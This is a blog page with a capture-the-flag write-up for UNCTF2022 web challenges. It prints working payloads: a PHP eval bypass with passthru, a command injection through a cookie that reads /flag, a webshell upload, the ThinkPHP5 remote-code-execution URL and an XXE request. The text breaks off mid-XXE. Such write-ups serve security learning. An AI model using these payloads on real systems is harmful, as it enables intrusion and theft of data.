<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="UNCTF2022  WP  By  Zeroc本博客的第一篇正式文章，上周结束的UNCTF，我也是有幸登顶了校内赛，第一次拿到第一名对我来说还是很有意义的，继续加油吧。">
<meta property="og:type" content="article">
<meta property="og:title" content="UNCTF2022-WP">
<meta property="og:url" content="http://example.com/CTF-WP/UNCTF2022-WP/index.html">
<meta property="og:site_name" content="Zeroc&amp;小破站">
<meta property="og:description" content="UNCTF2022  WP  By  Zeroc本博客的第一篇正式文章，上周结束的UNCTF，我也是有幸登顶了校内赛，第一次拿到第一名对我来说还是很有意义的，继续加油吧。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056794.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056690.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056363.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056056.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056067.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056793.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056676.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056574.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056605.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056337.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056105.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056647.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056716.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056689.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056392.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055856.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055366.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055174.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055117.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055980.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055236.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055202.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055121.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055719.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055696.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055893.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055288.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055265.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055241.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055804.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055582.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055456.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055269.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055544.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055703.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054657.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054789.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054006.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054051.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054550.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054242.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054230.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054358.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054067.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054010.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053874.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053819.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053931.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053685.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053957.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053199.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053857.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053254.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053809.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053988.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053864.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035403.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035322.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035996.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035243.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035090.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035230.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035061.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202113397.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202031407.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202031337.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202033496.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202033619.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202029718.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028284.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028293.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028021.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202027965.png">
<meta property="og:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202123976.png">
<meta property="article:published_time" content="2022-11-20T11:14:42.000Z">
<meta property="article:modified_time" content="2022-12-23T08:15:34.357Z">
<meta property="article:author" content="Zeroc">
<meta property="article:tag" content="Write-up">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056794.png">

<link rel="canonical" href="http://example.com/CTF-WP/UNCTF2022-WP/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>UNCTF2022-WP | Zeroc&小破站</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Zeroc&小破站</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">多找自身原因</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">1</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">3</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/CTF-WP/UNCTF2022-WP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Zeroc">
      <meta itemprop="description" content="莫忘少年凌云志，曾许天下第一流">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zeroc&小破站">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          UNCTF2022-WP
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-20 19:14:42" itemprop="dateCreated datePublished" datetime="2022-11-20T19:14:42+08:00">2022-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-23 16:15:34" itemprop="dateModified" datetime="2022-12-23T16:15:34+08:00">2022-12-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-WP/" itemprop="url" rel="index"><span itemprop="name">CTF-WP</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>49k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>45 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="UNCTF2022-WP-By-Zeroc"><a href="#UNCTF2022-WP-By-Zeroc" class="headerlink" title="UNCTF2022  WP  By  Zeroc"></a>UNCTF2022  WP  By  Zeroc</h1><p>本博客的第一篇正式文章，上周结束的<code>UNCTF</code>，我也是有幸登顶了校内赛，第一次拿到第一名对我来说还是很有意义的，继续加油吧。</p>
<meta name="referrer" content="no-referrer"/>

<span id="more"></span>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>只能说出的最好的应该是<strong>签到题</strong>（</p>
<h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><p>打开发现是一个打怪的游戏，肯定不能硬玩，先看游戏源码<code>main.js</code>。</p>
<p>试着查找<code>unctf</code>，还真找到了，boss死了后会触发一个函数，在控制台输出即可得到flag。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056794.png" alt=""></p>
<h3 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h3><p>打开靶机是一个<code>phpinfo</code>的界面，先试着查找关键字。</p>
<p>结果发现直接ctrl+F查找flag即可。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056690.png" alt=""></p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>打开靶机后是一个<code>Apache2 Ubuntu Default Page</code>页面，访问<code>/index.php</code>得到源码。</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]==<span class="number">0</span>&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>])&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>]))&#123;</span><br><span class="line">            <span class="variable">$key1</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>];</span><br><span class="line">            <span class="variable">$key2</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key1</span>!==<span class="variable">$key2</span>&amp;&amp;<span class="title function_ invoke__">sha1</span>(<span class="variable">$key1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$key2</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>]))&#123;</span><br><span class="line">                    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|txt|cat|tac|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;有手就行&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;老套路了&lt;/br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;百度就能搜到的东西&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单的绕过和命令执行。</p>
<p>科学计数法绕过弱比较，数组绕过<code>sha1()</code>，利用<code>passthru()</code>进行命令执行即可，最后在环境变量里找到flag。</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//cbbb5195-0fe9-4e1a-8b27-81bcd415c731.node.yuzhian.com.cn/index.php?code=passthru(&quot;env&quot;);</span></span><br><span class="line">POST:</span><br><span class="line">a=<span class="number">0e7</span>&amp;key1[]=<span class="number">1</span>&amp;key2[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p>加<code>GIF89a</code>上传一个png之后抓包改为php，蚁剑连接后直接利用find命令查找flag即可。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056363.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056056.png" alt=""></p>
<h3 id="我太喜欢bilibili大学啦修复版"><a href="#我太喜欢bilibili大学啦修复版" class="headerlink" title="我太喜欢bilibili大学啦修复版"></a>我太喜欢bilibili大学啦修复版</h3><p>打开靶机是<code>phpinfo</code>界面，查找<code>hint</code>得到第一个hint：<code>admin_unctf.php</code>。</p>
<p>访问是一个登录界面，源码提示抓包看看：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056067.png" alt=""></p>
<p>得到登录密码：<code>unctf2022/unctf2022</code>。</p>
<p>显示页面源码。</p>
<p>接着就是简单的命令执行，利用管道符分割命令即可，传参的位置为cookie。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;FLAG=nonono&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;username or password is empty&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="string">&quot;ping &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;username or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">Cookie: cmd=<span class="number">127.0</span>.<span class="number">0.1</span>|cat /flag</span><br></pre></td></tr></table></figure>
<p>得到一串base64编码，解码后得到一个网址<code>https://space.bilibili.com/673907356</code>，访问即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056793.png" alt=""></p>
<h3 id="302"><a href="#302" class="headerlink" title="302"></a>302</h3><p>(我只能说，屑)</p>
<p>考察<strong>页面重定向</strong>等知识，首先抓包，直接访问原地址：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056676.png" alt=""></p>
<p>要求<strong>get和post传参</strong>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056574.png" alt=""></p>
<p>接着需要<strong>伪造cookie</strong>，伪造后得到一个phpinfo界面，查找<code>UNCTF</code>即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056605.png" alt=""></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?miku=puppy HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> aaf2bd2d<span class="number">-98</span>a3<span class="number">-4691</span><span class="number">-9255</span>-f8c5272a9181.node.yuzhian.com.cn</span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv<span class="punctuation">:</span><span class="number">106.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">106.0</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cookie: admin=true;</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">micgo=ikun</span></span><br></pre></td></tr></table></figure>
<h3 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h3><p>打开靶机后是一个<code>ThinkPHP5</code>的界面，可以联想到其漏洞，漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致远程命令执行漏洞。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056337.png" alt=""></p>
<h3 id="听说PHP有个XXE"><a href="#听说PHP有个XXE" class="headerlink" title="听说PHP有个XXE"></a>听说PHP有个XXE</h3><p>页面提示访问<code>hint</code>，下载文件后打开：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056105.png" alt=""></p>
<p>访问<code>dom.php</code>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056647.png" alt=""></p>
<p><code>DOMDocument::loadXML():</code>可以从字符串中加载xml文档，存在<code>XXE</code>漏洞，直接试着访问根目录下的flag文件得到flag。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /dom.php HTTP/1.1</span><br><span class="line">Host: 713bc3e7-0605-4f6d-ad6d-0255de339625.node.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE XXE [ </span><br><span class="line"> </span><br><span class="line">&lt;!ENTITY zeroc 